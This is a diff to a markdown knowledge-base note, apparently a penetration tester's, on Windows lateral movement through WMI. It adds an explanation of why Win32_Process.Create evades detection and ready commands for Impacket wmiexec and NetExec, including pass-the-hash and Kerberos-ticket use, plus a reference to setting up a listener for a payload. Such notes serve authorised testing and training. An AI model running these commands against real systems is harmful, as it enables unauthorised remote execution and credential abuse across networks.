@@ -9,6 +9,8 @@ tags:
   - active
 ---
  
+WMI (Windows Management Instrumentation) exposes a management interface reachable over DCOM (port 135 + a dynamic high port) or, on newer systems, WinRM. Because `Win32_Process.Create` runs a process as the authenticating user, it is a reliable lateral movement primitive once we hold local admin on the target — and it is stealthier than PsExec-style techniques since it does not drop a service binary on disk.
+
 > [!Requirements]
 > To create a process on the remote target via WMI, we need the credentials of a member of the _Administrators_ local group, which can also be a domain user.
 
@@ -55,3 +57,36 @@ python3 encode.py
 ```
 
 Paste the full command on the $command, setup a listener and start the WMI session
+
+---
+
+# Alternatives from a Linux attack host
+
+Doing this by hand is rarely necessary — several tools wrap the same `Win32_Process.Create` call and, crucially, support **Pass-the-Hash**, so a cracked/dumped NT hash is enough (no plaintext needed):
+
+- Impacket `wmiexec` — semi-interactive shell over WMI (DCOM):
+```bash
+$ impacket-wmiexec DOMAIN/USER:PASSWORD@TARGET_IP
+
+# Pass-the-Hash:
+$ impacket-wmiexec -hashes :NT_HASH DOMAIN/USER@TARGET_IP
+
+# Kerberos ticket (see [[Pass the Ticket (PtT)]]):
+$ KRB5CCNAME=ticket.ccache impacket-wmiexec -k -no-pass DOMAIN/USER@TARGET_FQDN
+```
+
+- NetExec / CrackMapExec — validate access and run a command across many hosts at once:
+```bash
+$ netexec wmi TARGET_IP -u USER -p PASSWORD -x "whoami"
+$ netexec wmi TARGET_IP -u USER -H NT_HASH -x "whoami"   # Pass-the-Hash
+```
+
+> [!Note]
+> Generate the base64 payload above (or any command) with the [[Payloads]] / [[Shells]] notes, and start the listener before triggering execution.
+
+# Related notes
+- [[Impacket]] — full impacket toolkit (wmiexec/psexec/atexec/smbexec)
+- [[Pass the Hash (PtH)]] — reusing NT hashes, which all the tools above support
+- [[Pass the Ticket (PtT)]] — Kerberos-based auth (`-k`)
+- [[WinRM]] · [[Enter-PSSession]] · [[RDP]] — other lateral movement channels
+- [[AD Enumeration - Credentialed - From Linux]] — obtaining the admin creds WMI needs
